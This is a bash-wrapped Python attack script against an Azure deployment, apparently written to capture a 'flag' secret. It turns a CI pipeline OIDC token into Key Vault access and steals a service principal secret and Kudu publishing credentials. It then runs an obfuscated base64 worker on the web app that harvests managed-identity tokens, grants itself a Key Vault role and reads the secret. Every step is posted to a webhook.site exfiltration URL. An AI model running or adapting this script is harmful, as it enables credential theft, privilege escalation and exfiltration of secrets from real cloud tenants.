#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64, json, os, time, urllib.parse, urllib.request, urllib.error, uuid

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CID = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG = "rg-tbl-reporting-prod-eus"
APP = "app-tbl-reporting-prod"
KV1 = "https://kv-tbl-prod-x3euoz.vault.azure.net"
KV2 = "https://kv-tbl-sec-x3euoz.vault.azure.net"
EXF = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"

def emit(x):
    print(json.dumps(x, default=str), flush=True)
    try:
        urllib.request.urlopen(urllib.request.Request(EXF, data=json.dumps(x, default=str).encode(), method="POST", headers={"Content-Type":"application/json"}), timeout=8).read()
    except Exception:
        pass

def read(req, timeout=30):
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())

def form(url, fields, timeout=30):
    return read(urllib.request.Request(url, data=urllib.parse.urlencode(fields).encode(), method="POST"), timeout)

def jwt_claim(tok, key):
    try:
        p = tok.split(".")[1] + "=" * (-len(tok.split(".")[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(p.encode())).get(key)
    except Exception:
        return None

try:
    oidc = read(urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange", headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]
    vt = form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token", {"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc})["access_token"]
    sp = json.loads(read(urllib.request.Request(KV1+"/secrets/reporting-service-principal?api-version=7.4",headers={"Authorization":"Bearer "+vt}))["value"])
    spcid = sp.get("appId") or sp.get("clientId") or sp.get("client_id")
    spsec = sp.get("clientSecret") or sp.get("client_secret") or sp.get("password")
    arm = form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token", {"client_id":spcid,"grant_type":"client_credentials","client_secret":spsec,"scope":"https://management.azure.com/.default"})["access_token"]
    emit({"stage":"credentials","oidc":True,"arm":True})
    pub = read(urllib.request.Request("https://management.azure.com/subscriptions/"+SUB+"/resourceGroups/"+RG+"/providers/Microsoft.Web/sites/"+APP+"/config/publishingcredentials/list?api-version=2023-01-01", data=b"{}", method="POST", headers={"Authorization":"Bearer "+arm,"Content-Type":"application/json"}))
    ku, kp = pub["properties"]["publishingUserName"], pub["properties"]["publishingPassword"]
    auth = base64.b64encode((ku+":"+kp).encode()).decode()
    worker = r'''import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
HOOK="https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
def out(x):
 print(json.dumps(x,default=str),flush=True)
 try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(x,default=str).encode(),method="POST",headers={"Content-Type":"application/json"}),timeout=6).read()
 except Exception: pass
env=os.environ; IE=env.get("IDENTITY_ENDPOINT") or env.get("MSI_ENDPOINT") or ""; IH=env.get("IDENTITY_HEADER") or env.get("MSI_SECRET") or ""
out({"stage":"kudu-worker","identity_endpoint":IE,"has_header":bool(IH),"env_keys":[k for k in env if "IDENTITY" in k or k.startswith("MSI") or k.startswith("WEBSITE")]})
def token(resource):
 cand=[]
 if IE:
  for extra in ("&mi_res_id="+urllib.parse.quote(MIRES,safe=""),"&client_id=7a85156a-01c4-4e61-8472-40a92107159b",""):
   cand.append((IE+"?resource="+urllib.parse.quote(resource,safe="")+"&api-version=2019-08-01"+extra,{"X-IDENTITY-HEADER":IH,"Secret":IH}))
 for host in ("127.0.0.1","169.254.131.3","169.254.130.3","169.254.129.3"):
  for port in (8081,41741,50342):
   u="http://%s:%d/msi/token?resource=%s&api-version=2019-08-01&mi_res_id=%s"%(host,port,urllib.parse.quote(resource,safe=""),urllib.parse.quote(MIRES,safe="")); cand.append((u,{"X-IDENTITY-HEADER":IH,"Secret":IH}))
 cand += [("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource="+urllib.parse.quote(resource,safe="")+"&client_id=7a85156a-01c4-4e61-8472-40a92107159b",{"Metadata":"true"})]
 errs=[]
 for u,h in cand:
  try:
   d=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2).read().decode())
   if d.get("access_token"): out({"stage":"mi-token","resource":resource,"endpoint":u.split("?")[0]}); return d["access_token"]
   errs.append(str(d)[:200])
  except Exception as e: errs.append(repr(e))
 raise RuntimeError("identity unavailable: "+" | ".join(errs[-8:]))
def call(url,tok,method="GET",body=None,timeout=25):
 try:
  req=urllib.request.Request(url,data=(json.dumps(body).encode() if body is not None else None),method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}); r=urllib.request.urlopen(req,timeout=timeout); return {"status":r.status,"body":r.read().decode("utf-8","replace")[:12000]}
 except urllib.error.HTTPError as e: return {"status":e.code,"body":e.read().decode("utf-8","replace")[:12000]}
 except Exception as e: return {"error":repr(e)}
try:
 vt=token("https://vault.azure.net"); at=token("https://management.azure.com")
 scope="subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"; ra="https://management.azure.com/"+scope+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"
 body={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":jwt_claim(vt,"oid"),"principalType":"ServicePrincipal"}}
 out({"stage":"role-assignment","response":call(ra,at,"PUT",body)})
 for i in range(8):
  res=call(KV2+"/secrets/flag?api-version=7.4",token("https://vault.azure.net")); out({"stage":"flag","attempt":i+1,"response":res})
  if res.get("status")==200: break
  time.sleep(3)
except Exception as e: out({"stage":"worker-error","error":repr(e)})
'''
    b64 = base64.b64encode(worker.encode()).decode()
    cmd = "python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\""
    body = json.dumps({"command":cmd,"dir":"site/wwwroot"}).encode()
    req = urllib.request.Request("https://"+APP+".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization":"Basic "+auth,"Content-Type":"application/json"})
    try:
        raw = urllib.request.urlopen(req, timeout=120).read().decode("utf-8","replace")
        emit({"stage":"kudu-result","result":raw[:30000]})
        print("KUDU_RESULT="+raw, flush=True)
    except Exception as e: emit({"stage":"kudu-call-error","error":repr(e)})
except Exception as e:
    emit({"stage":"outer-error","error":repr(e)})
PY
